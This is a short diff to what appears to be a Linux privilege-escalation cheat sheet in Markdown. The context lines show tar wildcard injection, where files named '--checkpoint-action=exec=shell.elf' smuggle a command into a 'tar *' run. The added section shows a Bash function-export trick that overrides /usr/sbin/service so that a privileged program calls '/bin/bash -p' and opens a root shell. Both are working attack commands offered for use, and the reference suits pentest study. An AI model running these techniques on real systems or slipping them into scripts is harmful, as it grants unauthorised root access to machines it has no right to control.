@@ -37,3 +37,13 @@ If some script is using some like: `tar czf file.tar.gz *`.
 touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
 ```
+
+## Abusing Shell Features
+
+Bash `<4.2-048` you can define shell functions to overwrite paths.
+
+```bash
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+./run/your/app
+```
